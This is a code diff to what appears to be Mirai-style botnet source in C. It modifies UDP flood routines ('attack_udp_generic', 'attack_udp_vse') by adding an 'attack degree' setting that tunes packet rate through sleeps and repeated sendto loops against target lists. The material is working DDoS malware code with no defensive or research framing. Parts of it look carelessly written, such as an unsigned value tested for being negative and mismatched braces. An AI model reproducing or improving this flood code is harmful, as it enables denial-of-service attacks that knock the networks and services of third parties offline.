@@ -84,10 +84,32 @@ void attack_udp_generic(uint8_t targs_len, struct attack_target *targs, uint8_t 
         udph->dest = htons(dport);
         udph->len = htons(sizeof (struct udphdr) + data_len);
     }
-	while (TRUE)
+
+
+        //attack degree adjustment
+        uint32_t conf = attack_get_opt_int(opts_len, opts, ATK_OPT_DEGREE, 100);
+        if(conf<0)
+            conf=0;
+        if(conf>100)
+           conf=100;
+        //1ms
+        struct timespec req = {0,(100-conf)*1000000*0.80};
+        //uint32_t rand;
+        int fc;
+        //printf("[attack_vse]%d",conf);
+
+    while (TRUE)
     {
-      for (i = 0; i < targs_len; i++)
+        for (i = 0; i < targs_len; i++)
         {
+
+        //attack degree adjustment      
+        //  for(j = 0; j < 100 - conf; j++){
+         if(conf!=100)
+                nanosleep(&req,NULL);
+//      }
+        for(fc=0;fc<50*conf;fc++){
+
             char *pkt = pkts[i];
             struct iphdr *iph = (struct iphdr *)pkt;
             struct udphdr *udph = (struct udphdr *)(iph + 1);
@@ -133,10 +155,10 @@ void attack_udp_generic(uint8_t targs_len, struct attack_target *targs, uint8_t 
 
 
 }
-
+}
 void attack_udp_vse(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
-    int i, fd;
+    int i, fd, j;
     char **pkts = calloc(targs_len, sizeof (char *));
     uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
     uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
@@ -203,9 +225,13 @@ void attack_udp_vse(uint8_t targs_len, struct attack_target *targs, uint8_t opts
 
 	//attack degree adjustment
         uint32_t conf = attack_get_opt_int(opts_len, opts, ATK_OPT_DEGREE, 100);
-	//0.001ms
-	struct timespec req = {0,1000};
-	uint32_t rand;
+	if(conf<0)
+	    conf=0;
+	if(conf>100)
+	   conf=100;
+	//1ms
+    	struct timespec req = {0,(100-conf)*1000000*0.80};
+	//uint32_t rand;
 	int fc;
 	//printf("[attack_vse]%d",conf);
 
@@ -215,11 +241,13 @@ void attack_udp_vse(uint8_t targs_len, struct attack_target *targs, uint8_t opts
         {
 
 	//attack degree adjustment	
-	rand=(rand_next())%100;
-	if(rand>=conf){
-	        nanosleep(&req,NULL);
-	}else{
-	for(fc=0;fc<1000;fc++){
+	//rand=(rand_next())%100;
+	//if(rand>=conf){
+  //  for(j = 0; j < 100 - conf; j++){
+	 if(conf!=100)       
+		nanosleep(&req,NULL);
+//	}
+	for(fc=0;fc<100*conf;fc++){
 
             char *pkt = pkts[i];
             struct iphdr *iph = (struct iphdr *)pkt;
@@ -244,7 +272,7 @@ void attack_udp_vse(uint8_t targs_len, struct attack_target *targs, uint8_t opts
       sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
 
 		}
-        }
+		       
 #ifdef DEBUG
 
             //break;
